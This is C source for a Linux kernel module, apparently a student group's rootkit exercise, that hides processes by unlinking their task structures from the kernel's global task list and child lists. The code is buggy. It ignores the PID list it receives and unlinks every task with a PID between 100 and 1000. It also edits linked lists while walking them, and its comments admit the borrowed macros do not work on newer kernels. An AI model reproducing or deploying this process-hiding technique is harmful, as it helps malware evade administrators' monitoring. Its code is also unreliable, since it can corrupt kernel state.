#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"


/* the followin macros are taken from linux kernel source code (2.6.11)
   they probably remove a task from the task list - have to try it out */
// note that they don't seem to work in linux 2.6.32
#define REMOVE_LINKS(p) do {                                    \
        if (thread_group_leader(p))                             \
                list_del_init(&(p)->tasks);                     \
        remove_parent(p);                                       \
        } while (0)

#define SET_LINKS(p) do {                                       \
        if (thread_group_leader(p))                             \
                list_add_tail(&(p)->tasks,&init_task.tasks);    \
        add_parent(p, (p)->parent);                             \
        } while (0)

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);

fun_ssize_t_int_pvoid_size_t     original_read;


static int pids_to_hide[200];
static int pids_count = 0;
module_param_array(pids_to_hide, int, &pids_count, 0000);
MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");


void hide_processes_traverse_tree(struct task_struct* task){
    // traverse all children
    struct task_struct* cur;
    struct task_struct* prev;
    struct task_struct* next;
    struct list_head* p;
    OUR_DEBUG("Traversing tree (pid %d)\n", task->pid);
    list_for_each(p, &(task->children)){
        cur = list_entry(p, struct task_struct, sibling);
        prev = list_entry_rcu(cur->sibling.prev, struct task_struct, sibling);
        next = list_entry_rcu(cur->sibling.next, struct task_struct, sibling);
        prev->sibling.next = cur->sibling.next;
        next->sibling.prev = cur->sibling.prev;
        OUR_DEBUG("found pid: %d\n", cur->pid);
        if (cur != task){
            hide_processes_traverse_tree(cur);
        }
    }
}

void hide_processes(void){
    struct task_struct* task;
    struct task_struct* prev;
    struct task_struct* next;
    task = &init_task;
    prev = NULL;
    OUR_DEBUG("Now tree-traversal\n");
    hide_processes_traverse_tree(&init_task);
    OUR_DEBUG("Now manipulating task_structs...\n");
    do {
        hide_processes_traverse_tree(task);
        // the previous task (prev) is obtained by a expanded macro
        //  found in the linux kernel. it is basically the
        //  adapted expansion of "next_task"
        prev = list_entry_rcu(task->tasks.prev, struct task_struct, tasks);
        next = next_task(task);
        if ((task->pid > 100) && (task->pid < 1000)){
            OUR_DEBUG("1 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
            OUR_DEBUG("1 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
            OUR_DEBUG("task %p, prev %p\n", task, prev);
            OUR_DEBUG("task->next %p, prev->next %p\n", task->tasks.next, prev->tasks.next);
            // hide tasks from "global task linked list" (?!)
            prev->tasks.next = task->tasks.next;
            next->tasks.prev = task->tasks.prev;
            // hide tasks from tree-like structures
            OUR_DEBUG("2 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
            OUR_DEBUG("2 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
        }
    } while ((task = next) != &init_task);
}


/* Initialization routine */
static int __init _init_module(void)
{
    int i;
    struct task_struct *task;

    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");

    printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
    for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
        printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
    }


    hide_processes();
    hide_processes();
    for_each_process(task)
    {
    printk("%s [%d]\n",task->comm , task->pid);
    }


    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
